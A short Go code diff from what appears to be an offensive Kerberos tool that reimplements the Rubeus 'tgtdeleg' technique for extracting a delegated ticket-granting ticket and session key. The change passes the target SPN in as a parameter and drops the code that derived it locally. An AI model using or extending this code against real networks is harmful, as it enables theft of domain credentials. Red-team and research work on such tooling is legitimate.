@@ -252,7 +252,7 @@ func ExtractTGTDeleg() (*TGTDelegResult, error) {
 	}
 
 	// Step 4: Extract TGT from the authenticator using the session key
-	tgt, sessionKey, err := extractFromAPREQWithKey(apReq, token, contextSessionKey)
+	tgt, sessionKey, err := extractFromAPREQWithKey(apReq, token, contextSessionKey, spnTarget)
 	if err != nil {
 		return nil, fmt.Errorf("failed to extract credentials: %w", err)
 	}
@@ -548,7 +548,7 @@ func min(a, b int) int {
 	return b
 }
 
-func extractFromAPREQWithKey(apReq *asn1krb5.APREQ, rawToken []byte, sessionKey []byte) (*ticket.Kirbi, []byte, error) {
+func extractFromAPREQWithKey(apReq *asn1krb5.APREQ, rawToken []byte, sessionKey []byte, targetSPN string) (*ticket.Kirbi, []byte, error) {
 	// EDUCATIONAL: TGT Delegation - The Full Extraction Process
 	//
 	// The Rubeus tgtdeleg trick works like this:
@@ -563,14 +563,6 @@ func extractFromAPREQWithKey(apReq *asn1krb5.APREQ, rawToken []byte, sessionKey 
 	// If no session key provided from context, try to get it from the ticket cache
 	if len(sessionKey) == 0 {
 		fmt.Println("[*] No session key from context, trying ticket cache...")
-
-		// Build SPN from the ticket
-		targetSPN := ""
-		if len(apReq.Ticket.SName.NameString) >= 2 {
-			targetSPN = fmt.Sprintf("%s/%s", apReq.Ticket.SName.NameString[0], apReq.Ticket.SName.NameString[1])
-		} else if len(apReq.Ticket.SName.NameString) == 1 {
-			targetSPN = apReq.Ticket.SName.NameString[0]
-		}
 
 		fmt.Printf("[*] Retrieving session key for SPN: %s\n", targetSPN)
 
